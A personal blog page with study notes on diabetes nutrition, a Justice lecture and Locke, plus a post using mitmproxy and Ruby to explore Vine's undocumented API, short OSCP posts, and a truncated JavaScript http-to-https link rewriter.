
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>curious and driven</title>
	<meta name="author" content="khakimov">

	
	<meta name="description" content="Plan: Week 3 of Nutrition: Diabetes
Lecture 9 Markets and Morals: Military service
Karamazov&#8217;s brothers are waiting ;)
Check the RVs website &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="curious and driven" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>

<body>
	<header id="header" class="inner"><h1><a href="/">curious and driven</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/blog/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/blog/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="http://google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:khakimov.github.com">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
	</div>
	<form class="search" action="http://google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:khakimov.github.com">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner">


    <article class="post">
	<h1 class="title"><a href="/blog/2013/07/16/july-16-tuesday/">Nutrition for Health</a></h1>
	<div class="entry-content">
		<p><strong>Plan:</strong></p>

<ul>
<li><s>Week 3 of Nutrition: Diabetes</s></li>
<li><s>Lecture 9 Markets and Morals: Military service</s></li>
<li><s>Karamazov&#8217;s brothers are waiting ;)</s></li>
<li>Check the RVs website about renting for BurningMan</li>
<li>read about Plato (wikipedia)</li>
</ul>


<hr />

<p><strong>Nutrition</strong></p>

<h2>Definitions and Diagnoses</h2>

<ul>
<li>Chronic disease</li>
<li>Occurs when pancreas doesn&#8217;t produce enough insulin</li>
<li>or when pancreas cannot effectively use the insulin it produces</li>
<li>hyperglycemia (high blood sugar)</li>
<li>leading cause of blindness, amputation and kidney failure</li>
<li>347 million people</li>
<li>deaths will double between 2005 and 2030</li>
<li>26 million in US (diagnosed 18.8 million and undiagnosed 7 million)</li>
<li>prediabetes 79 million people</li>
<li>2.4 cost more for people with diabete</li>
</ul>


<h2>Type 1</h2>

<ul>
<li>results from Betta-cell destruction, usually leading to absolute insulin deficiency</li>
<li>5-10% of all cases of diabetes</li>
<li>IDDM or juvenile-onset diabetes</li>
</ul>


<h2>Type 2</h2>

<ul>
<li>results from progressive insulin secretory defect on background of insulin resistence</li>
<li>90-95% of all cases</li>
<li>NIDDM or adult-onset diabetes</li>
</ul>


<h2>Diagnosis</h2>

<p>Drink glucose and test blood in 2 hour (OGTT) > 200 mg/dL</p>

<h2>Prediabetes</h2>

<p>Don&#8217;t meet criteria for diabetes, high risk for future diabetes. Usually associated with obesity (abdominal or visceral), dyslepidemia. If OGTT test shows 140-199 mg/dL.</p>

<p>If BMI > 25 and one of from the list physical inactive, high-risk race/ethinicity, hypertension (blood pressure > 140/90).</p>

<p>recommendations for prediabetes:</p>

<ul>
<li>7% body weight loss</li>
<li>regular physical activity (150 min/week)</li>
<li>spread over at least 3 days/week</li>
<li>reduce calories and fat intake</li>
<li>target heart rate 50-70% (max rate = 220 - age in yr)</li>
</ul>


<h2>Physical Activity and Weight</h2>

<p>Overweigh gain insulin resistance. 5% body weight loss associated with improved insulin sensetivity. Regular exercise has been shown to improve blood glucose control and well-being, reduce CVD risk factors and promote weight loss.</p>

<h2>Hypoglycemia</h2>

<p>Low blood sugar (&lt;70)</p>

<h2>Meal Planning</h2>

<ul>
<li>very personal</li>
<li>monitoring carbohydrate is a key</li>
<li>14g fiber per 1000 calories consumed</li>
<li>no room for soda, fruit juice</li>
<li>saturated fat should be &lt; 7% of total calories (16 g for 2000 cal diet)</li>
<li>2 drinks per day for men</li>
<li>fluids 12 8-oz cups/day</li>
</ul>


<p><em>Hypoglycemia managment</em> - 15-20 g carbohydrate and wait 15 minutes, test again and repeat if necessary.</p>

<h2>Example:</h2>

<p>Darrell, height 5&#8217;8&#8221; (173 cm), weight 220 lbs (100 kg), BMI 33 (obese). For weight loss need 20-25 cal/kg. Exercise day 2500 calories (2000 cal rest)</p>

<ul>
<li>carbs 55% (1375 cals or 350 g)</li>
<li>protein 20% (500 cals or 125 g)</li>
<li>fat 25% (625 cals or 69 g)</li>
<li>14 g fiber per 1000 calories consumed (35 g)</li>
</ul>


<table>
<thead>
<tr>
<th>Meal </th>
<th> Carbs</th>
</tr>
</thead>
<tbody>
<tr>
<td>Breakfast </td>
<td> 50</td>
</tr>
<tr>
<td>Snack </td>
<td> 50</td>
</tr>
<tr>
<td>Lunch </td>
<td> 75</td>
</tr>
<tr>
<td>Snack </td>
<td> 50</td>
</tr>
<tr>
<td>Dinner </td>
<td> 75</td>
</tr>
<tr>
<td>Snack </td>
<td> 50</td>
</tr>
<tr>
<td><strong>Total</strong> </td>
<td> 350</td>
</tr>
</tbody>
</table>


<p>Carbs choices:</p>

<ul>
<li>whole grain breads</li>
<li>brown rice</li>
<li>fruits &amp; vegetables</li>
<li>popcorn, nuts, seeds</li>
<li>lowfat/nonfat milk and yogurs</li>
<li>dried peas, beans</li>
</ul>


<p>Protein choices:</p>

<ul>
<li>turkey and chicken breast</li>
<li>lean cuts beef, round, loin</li>
<li>eggs and egg whites</li>
<li>olive, canola oil</li>
<li>nonfat dairy foods</li>
<li>dried peas, beans</li>
<li>nuts, seeds</li>
<li>tofu, soy foods</li>
<li>grilled, baked, broiled fish</li>
</ul>


<p>Fat choices:</p>

<ul>
<li>olive, canola oil</li>
<li>turkey and chicken breast</li>
<li>lower fat margarines</li>
<li>nuts, seeds</li>
<li>fruit desserts, low sugar</li>
</ul>


<h2>Carbohydrate Counting</h2>

<p>counting carbs can help control blood glucose
containing foods:</p>

<ul>
<li>breads, crackers, <em>cereals</em></li>
<li>pasta, <em>rice</em>, grains</li>
<li>starchy vegetables: potatoes, corn, peas</li>
<li>nonstarchy vegs: broccoli, greens, carrots</li>
<li>milk and <em>yogurt</em></li>
<li>fruits and juice</li>
<li>sweets and desserts</li>
</ul>


<p>15 grams carbohydrate in:</p>

<ul>
<li>1 small piece fresh fruit (4 oz)</li>
<li>1 slice bread (1 oz)</li>
<li>1/4 dry oatmeal</li>
<li>4-6 crackers</li>
<li>1/2 cup of black beans</li>
<li>1/2 large backed potato (3 oz)</li>
<li>2 small cookies</li>
<li>1/2 cup ice cream or sherbet</li>
<li>1 tortilla</li>
<li>1/3 cup dry pasta or rice</li>
<li>6 chicken nuggets</li>
</ul>


<p>Darrell&#8217;s Carbo Choices</p>

<table>
<thead>
<tr>
<th>Meal </th>
<th> Carbs</th>
</tr>
</thead>
<tbody>
<tr>
<td>breakfast: 1/2 cup of dry oatmeal (27 g), 1 cup nonfat milk (12g), 1/2 cup blueberries (11 g) </td>
<td> 50 g</td>
</tr>
<tr>
<td>snack: whole wheat pita bread (4&#8221; 15g), 1/2 cup hummus (25g), cucumber, sliced (4g), tomato (5g) </td>
<td> 49g</td>
</tr>
<tr>
<td>lunch: 3 oz curried chicken kabobs (5g), 1 cup long grain white rice (45g), 1 cup boiled greens (4g), 1 glass indian lassi made w/ yougurt, sugar, water (21g) </td>
<td> 75g</td>
</tr>
<tr>
<td>snack: 1 mango (31g), 1/4 cup almonds (4g), 1 oz potato chips (15g) </td>
<td> 50g</td>
</tr>
<tr>
<td>dinner: 1/2 cup pinto beans (22g), 2 corn tortillas (21g), 1/4 cup salsa (4g), 1/4 avocado (3g), 1 cup squash(10g), 1 orange (15g) </td>
<td> 75g</td>
</tr>
<tr>
<td>snack: 1 cup ice cream (37g), 1/2 banana (13g), 1 maraschino cherry (1g) </td>
<td> 51 g</td>
</tr>
</tbody>
</table>


<h2>Determining Calories</h2>

<p>10 calories for adult who is obese, very inactive
13 calories for adult over age 55
15 calories for a very active woman or active man
<em>20 calories</em> for a very <em>active man</em> or adult athlete</p>

<h2>Glycemic Index and Glycemid Load</h2>

<p>GI is rating system based on scale of 0 - 100, detemined experimentally (50 g carb and measure blood glucore response is measured). High-GI foods > 70, Low-GI &lt; 55. If you eat High-GI food it will cause your blood sugar to spike more rapidly (higher blood sugar).</p>

<p>GL = divide GI of a food by 100 and then multiply by grams of carb in 1 serving.</p>

<h2>Dietary Fiber and Blood sugar control</h2>

<p>Those who eat most fiber (8 grams/day) had a 30% lower risk of diabetes than those who ate least fiber from grains (3 grams/day).</p>

<p>14g fiber per 1000 calories consumed (half intake whole grains).</p>

<ul>
<li>fiber slow absorption of carbohydrate</li>
<li>leads to less marked increas in blood sugar</li>
<li>less demand for insulin</li>
</ul>


<h2>Types of fiber</h2>

<ul>
<li>gums</li>
<li>beta-glucans</li>
<li>psylium</li>
<li>resistant starches</li>
<li>pectin</li>
</ul>


<h2>Sweeteners</h2>

<p>Sucrose (glucose + fructose) - table sugar. Average american consumes 22-28 teaspoons of added sugars per day. 350 - 440 empty calories per day.</p>

<h2>Saccharin</h2>

<ul>
<li>first nonsugar</li>
<li>200-700 times sweeter than sugar</li>
<li>1970s cancer in rats</li>
<li>safe in moderate</li>
<li>stable, inexpensive</li>
</ul>


<h2>Aspartame </h2>

<ul>
<li>60-200 times sweeter than sugar</li>
<li>4kcal/gram, but 200X as sweet</li>
<li>non for cooking, used in sugar-free</li>
<li>cancer in rats, not in humans</li>
<li>people with PKU should avoid</li>
</ul>


<h2>Aceselfame K</h2>

<ul>
<li>salt that contains potassium</li>
<li>200 times sweeter than sugar</li>
</ul>


<h2>Sucralose</h2>

<ul>
<li>600 times sweeter than sucrose</li>
<li>water soluble and stable</li>
</ul>


<h2>Stevia</h2>

<ul>
<li>calorie-free</li>
<li>natural from sunflowers of C and S America</li>
<li>2008 sweetener</li>
<li>Truvia, SweetLeaf, Reb-A, PureVia</li>
</ul>


<hr />

<p><strong>Justice: Markets and Morals</strong></p>

<p>What matters is that political authority or military authority <em>not be arbitraty</em>. A sergent can command a soldier to go right up to the face of a cannon where he is almost sure to die.</p>

<h2>Ways to increas recruitment</h2>

<ol>
<li>Increase pay and benefits.</li>
<li>Shift to military conscription (призыв на военную службу) (a draft, lottery).</li>
<li>Outsource - hire mercenaries (наемник).</li>
</ol>


<p>Civil war system and all-volunteer army system</p>

<ul>
<li>paid army</li>
<li>volunteer army</li>
<li>outsourcing</li>
</ul>


<p>Consent as it applies to the market exchange. Leading the market allocate military service maybe unfair and may not even be free if there is severe <em>inequality in this society</em> so that people who buy their way into military service are doing so not because they really want to, but because <em>they have so few economic opportunities</em> that&#8217;s their best choice and <em>that is an element of coercion</em>.</p>

<p>Second objection about market where military service shouldn&#8217;t be treated as just another job for pay because it bound up with patriotism and civic obligation and so we shoulnd&#8217;t allocate duties by the market.</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2013-07-16T00:00:00-07:00" pubdate data-updated="true">Jul 16<span>th</span>, 2013</time></div>
	<div class="tags">

</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2013/07/15/diet-and-karamazovs/">Nutrition for Health</a></h1>
	<div class="entry-content">
		<p>Plan:</p>

<ul>
<li><s>watch week 2 of Nutrition about Heart Disease</s></li>
<li><s>read about John Locke and Property Rights</s> (just read 34 sections)</li>
<li><s>watch Lecture 8 of Justice</s></li>
<li>continue reading of Karamazov&#8217;s Brothers</li>
</ul>


<hr />

<p><strong>Nutrition</strong></p>

<ul>
<li>sodium limit 2,300mg per day to lower blood pressure</li>
<li>potassium has good effect on lowering blood pressure (only from food, not from suppliments)</li>
</ul>


<p>Sweet potato (694 mg), beet greens (1/2 cup 655 mg), yogurt plain non-fat (8 oz 579 mg), tomato puree, bananas, spinach and so on are good source of potassium.</p>

<p><img src="http://khakimov.github.com/images/07.15/dash.png" alt="DASH diet" /></p>

<p>DASH meal plan to lower blood pressure.</p>

<hr />

<p><strong>John Locke. Of the state of Nature.</strong></p>

<p>All men has a state of perfect freedom to order their actions within the bounds of the law of nature. A state also of equality, no one having more than another, creatures of the same cpecies and rank, have same advantages of nature, and the use of the same faculties.</p>

<p><strong>Sec 6</strong> Nothing may authroze us to destroy one another.</p>

<p><strong>Sec 7</strong> Any may do in prosecution of equality, every one must have a right to do. All men may be restrained from doing hurt to one another.</p>

<p><strong>Sec 8</strong> the only reasons, why one man may lawfully do harm to another, which is that we call punishment. Every man has a right to punish the offender and be executioner of the law of nature.</p>

<p><strong>Sec 11</strong> every man, in the state of nature, has a power to kill a murderer.</p>

<p><strong>Of the state of War</strong></p>

<p><strong>Sec 16</strong> Men should have a right to destroy that which threatens him with destruction. Preserver as much as possible, when all cannot be preserved, the safety of the innocent is to be preferred: and one may destroy a man who makes war upon him.</p>

<p><strong>Sec 17</strong> freedom being the foundation of everything else and if somebody would take it away - state of war.</p>

<p><strong>Sec 18</strong> this makes it lawful for a man to kill a thief that has no right to get a man in his power, he has no reason to suppoer, that thief, who would take away libery, would not take away everything else.</p>

<p><strong>Sec 20</strong> the state of war once begun, continues, with a right to the innocent party to destroy the other whenever he can, until the aggressor offers peace.</p>

<p><strong>Of Slavery</strong></p>

<p><strong>Sec 22</strong> natural liberty of man - to be free from any superior power on earth and not be under the will or legislative authority of man. Liberty for every one to do what he lists, to live as he pleases, and not to be tied by any laws.</p>

<p><strong>Sec 23</strong> no body can give more power than he has himself; and he that cannot take away his own life, cannot give another power over it.</p>

<p><strong>Sec 24</strong> drudgery isn&#8217;t slavery, because master coud not have power to kill and men was obliged to let go free out of his service.</p>

<p><strong>Of Property</strong></p>

<p><strong>Sec 25</strong> Men have a right to their preservation, but how any one should ever come to have a property in any thing.</p>

<p><strong>Sec 26</strong> The earth is given to men for the support and comfort of their being. The fruit or venison (оленина), which nourishes the wild Indian, who knows no enclosure, and is still a tenant in common, must be his, and so his, i.e. a part of him, that another can no longer have any right to it, before it can do him any good for the support of his life.</p>

<p><strong>Sec 27</strong> The labour of his body, and the work of his hands, we may say, are properly his.</p>

<p><strong>Sec 28</strong> Thus the grass my horse has bit; the turfs my servant has cut; and the ore I have digged in any place, where I have a right to them in common with others, become my property, without the assignation or consent of any body. The labour that was mine, removing them out of that common state they were in, hath fixed my property in them.</p>

<p><strong>Sec 29</strong> Men labor has taken it out of the hands of nature belonged equally to all her children, and hath thereby appropriated it to himself.</p>

<p><strong>Sec 32</strong> As much land as a man tills, plants, improves, cultivates, and can use the product of, so much is his property.</p>

<p>If someone violates the law of nature:
- he&#8217;s aggressor
- he&#8217;s beyond reason
and you can punish him (kill him as self-defence). It&#8217;s fierce and filled with violence and that is why people want to leave it with consent. The only way to escape the state of nature is undertake an active consent where you agree to give up the enforcement power and to create a goverment where it&#8217;ll be a legislation and everyone who enters to abide whatever the majority decide.</p>

<p><em>The supreme power cannot take from any man any part fo his property without his own consent.</em></p>

<p><em>Men therefore in society having property, they have such a right to the goods, which by the law <strong>of the community</strong> are theirs&#8230;</em></p>

<p><em>&#8230;Goverments cannot be supported without great charge, and it is fit every one who enjoys his share of the protection, should pay out of his estate his proportion for the maintenance of it. <strong>BUT</strong> still it mush be with his own consent, ie the consent of the majority, giving it either by themselves or their representatives chosen by them.</em></p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2013-07-15T00:00:00-07:00" pubdate data-updated="true">Jul 15<span>th</span>, 2013</time></div>
	<div class="tags">

</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2013/03/12/vines-undocumented-api/">Vine&#8217;s Undocumented API</a></h1>
	<div class="entry-content">
		<p><img src="https://si0.twimg.com/help/1362431499_1831" alt="" /></p>

<p>Last Sunday I played with <a href="http://vine.co">vine.co</a> iPhone application. Vine is a mobile service that lets you create, share short videos and sure enoght is a cool app, but has a small problem - sometimes I just want to share the video link with my friends without sharing it on facebook/twitter (yes, I didn&#8217;t find how to get direct link to specific vine and the only way was to share it on twitter and then copy the link). So, Sunday, night, iPhone, mitmproxy, ruby and curiosity how to get direct link to my vine.</p>

<p>First of all you need to setting up SSL interception. Follow this <a href="http://mitmproxy.org/doc/certinstall/ios.html">instruction</a>, mitmproxy-ca.pem you can find in the config directory (~/.mitmproxy by default). Then run mitmproxy, setup http proxy on iphone and run the app, you will see requests in mimtproxy</p>

<p><img src="http://i.imgur.com/qWJdmQE.png" alt="" /></p>

<p>Here I&#8217;ll post undocumented API links I&#8217;ve found and examples which you can use to authorize, request yours posts, timeline, search users, explore by using tags and so on. To get authorization key you can use this example</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'>  <span class="nb">require</span> <span class="s1">&#39;httparty&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="no">VINE</span> <span class="o">=</span> <span class="s2">&quot;com.vine.iphone/1.0.5 (unknown, iPhone OS 5.1.1, iPhone, Scale/2.000000)&quot;</span>
</span><span class='line'>  <span class="n">login</span> <span class="o">=</span> <span class="s2">&quot;login&quot;</span>
</span><span class='line'>  <span class="n">pass</span> <span class="o">=</span> <span class="s2">&quot;pass&quot;</span>
</span><span class='line'>  <span class="n">auth_url</span> <span class="o">=</span> <span class="s2">&quot;https://api.vineapp.com/users/authenticate&quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">response</span> <span class="o">=</span> <span class="no">HTTParty</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">auth_url</span><span class="p">,</span>
</span><span class='line'>    <span class="ss">:body</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>      <span class="ss">:username</span> <span class="o">=&gt;</span> <span class="n">login</span><span class="p">,</span>
</span><span class='line'>      <span class="ss">:deviceToken</span> <span class="o">=&gt;</span> <span class="s2">&quot;1111111111111111111111111111111111111111111111111111111111111111&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="ss">:password</span> <span class="o">=&gt;</span> <span class="n">pass</span><span class="p">},</span>
</span><span class='line'>    <span class="ss">:headers</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>      <span class="s2">&quot;User-Agent&quot;</span> <span class="o">=&gt;</span> <span class="no">VINE</span><span class="p">,</span>
</span><span class='line'>      <span class="s2">&quot;Accept&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;*/*&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="s2">&quot;Accept-Language&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;en, fr, de, ja, nl, it, es, pt, pt-PT, da, fi, nb, sv, ko, zh-Hans, zh-Hant, ru, pl, tr, uk, ar, hr, cs, el, he, ro, sk, th, id, ms, en-GB, ca, hu, vi, en-us;q=0.8&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="s2">&quot;Accept-Encoding&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;gzip&quot;</span>
</span><span class='line'>    <span class="p">})</span>
</span><span class='line'>    <span class="nb">p</span> <span class="n">response</span>
</span></code></pre></td></tr></table></div></figure>


<p>you will get something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">parsed_response</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;code&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="o">=&gt;</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;Username&quot;</span><span class="p">,</span> <span class="s2">&quot;userId&quot;</span><span class="o">=&gt;</span><span class="no">XXX</span><span class="p">,</span> <span class="s2">&quot;key&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;XXX&quot;</span><span class="p">},</span> <span class="s2">&quot;success&quot;</span><span class="o">=&gt;</span><span class="kp">true</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>where <strong>key</strong> is a session id which we will use to get timelines from the account</p>

<p>Here is example how you can get timeline from our account by using the key from auth request</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'>  <span class="nb">require</span> <span class="s1">&#39;httparty&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="no">VINE</span> <span class="o">=</span> <span class="s2">&quot;com.vine.iphone/1.0.5 (unknown, iPhone OS 5.1.1, iPhone, Scale/2.000000)&quot;</span>
</span><span class='line'>  <span class="n">login</span> <span class="o">=</span> <span class="s2">&quot;login&quot;</span>
</span><span class='line'>  <span class="n">pass</span> <span class="o">=</span> <span class="s2">&quot;pass&quot;</span>
</span><span class='line'>  <span class="n">timeline_url</span> <span class="o">=</span> <span class="s2">&quot;https://api.vineapp.com/timelines/graph&quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">response</span> <span class="o">=</span> <span class="no">HTTParty</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeline_url</span><span class="p">,</span>
</span><span class='line'>    <span class="ss">:headers</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>      <span class="s2">&quot;User-Agent&quot;</span> <span class="o">=&gt;</span> <span class="no">VINE</span><span class="p">,</span>
</span><span class='line'>      <span class="s2">&quot;vine-session-id&quot;</span> <span class="o">=&gt;</span> <span class="o">**</span><span class="n">key</span><span class="o">**</span><span class="p">,</span>
</span><span class='line'>      <span class="s2">&quot;Accept&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;*/*&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="s2">&quot;Accept-Language&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;en, fr, de, ja, nl, it, es, pt, pt-PT, da, fi, nb, sv, ko, zh-Hans, zh-Hant, ru, pl, tr, uk, ar, hr, cs, el, he, ro, sk, th, id, ms, en-GB, ca, hu, vi, en-us;q=0.8&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="s2">&quot;Accept-Encoding&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;gzip&quot;</span>
</span><span class='line'>    <span class="p">})</span>
</span><span class='line'>  <span class="nb">p</span> <span class="n">response</span>
</span></code></pre></td></tr></table></div></figure>


<p>Timeline:</p>

<ul>
<li>https://api.vineapp.com/timelines/graph</li>
</ul>


<p>Notifications:</p>

<ul>
<li>https://api.vineapp.com/users/#{userId}/notifications</li>
</ul>


<p>Explore:</p>

<ul>
<li>http://vine.co/explore?v=1.0.5</li>
<li>https://api.vineapp.com/timelines/popular</li>
<li>https://api.vineapp.com/timelines/promoted</li>
<li>https://api.vineapp.com/timelines/tags/magic</li>
<li>https://api.vineapp.com/timelines/tags/howto</li>
<li>https://api.vineapp.com/timelines/tags/soon</li>
</ul>


<p>Profile:</p>

<ul>
<li>https://api.vineapp.com/users/profiles/#{userId}</li>
<li>https://api.vineapp.com/timelines/users/#{userId}</li>
</ul>


<p>Search users:</p>

<ul>
<li>https://api.vineapp.com/users/search/test</li>
</ul>


<p>Twitter users:</p>

<ul>
<li>https://api.vineapp.com/users/#{userId}/following/suggested/twitter</li>
</ul>


<p>Settings:</p>

<ul>
<li>https://api.vineapp.com/users/me</li>
</ul>


<p>Likes:</p>

<ul>
<li>https://api.vineapp.com/timelines/users/#{userId}/likes</li>
</ul>


		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2013-03-12T22:03:00-07:00" pubdate data-updated="true">Mar 12<span>th</span>, 2013</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/re/'>re</a>, <a class='category' href='/blog/categories/vine/'>vine</a>


</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2013/03/05/the-offensive-security-certified-professional/">The Offensive Security Certified Professional</a></h1>
	<div class="entry-content">
		<p>We are happy to inform you that you have successfully completed your Certification Challenge and obtained your OSCP certification.</p>

<p><img src="http://medias.gifboom.com/medias/ca2d92bac98d430c8c46f676acfffa6d@2x.gif" alt="" /></p>

<p>ps: That was interesting, hard and I&#8217;ve learned a lot.</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2013-03-05T13:29:00-08:00" pubdate data-updated="true">Mar 5<span>th</span>, 2013</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/certification/'>certification</a>, <a class='category' href='/blog/categories/oscp/'>oscp</a>


</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2013/01/06/offensive-security-certified-professional/">Offensive Security Certified Professional</a></h1>
	<div class="entry-content">
		<p> I&#8217;m actively hacking away in a lab environment, preparing for the Offensive Security Certified Professional (OSCP) exam.</p>

<p> <img src="http://i.imgur.com/obg2H.gif" alt="" /></p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2013-01-06T15:34:00-08:00" pubdate data-updated="true">Jan 6<span>th</span>, 2013</time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/offsec/'>offsec</a>, <a class='category' href='/blog/categories/security/'>security</a>


</div>
	
</div></article>


    <article class="post">
	<h1 class="title"><a href="/blog/2012/12/23/automatically-rewrite-http-to-https-with-js/">Automatically Rewrite HTTP to HTTPS With JS</a></h1>
	<div class="entry-content">
		<p>I wrote the post <a href="http://khakimov.com/blog/2012/11/24/what-is-wrong-with-http-secure/">What Is Wrong With HTTP Secure</a> and my friend gave me an idea to try just rewrite hardcoded link (http:// -> https://). The beauty of JS are simplicity, documentations and tons of examples, so even if you don&#8217;t know how to get element without using jQuery it will be easy to figure out in couple minutes as I did in the night.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">===</span> <span class="s1">&#39;https:&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// http to https for &lt;link&gt;</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">links</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;link&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">links</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">links</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;http:&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
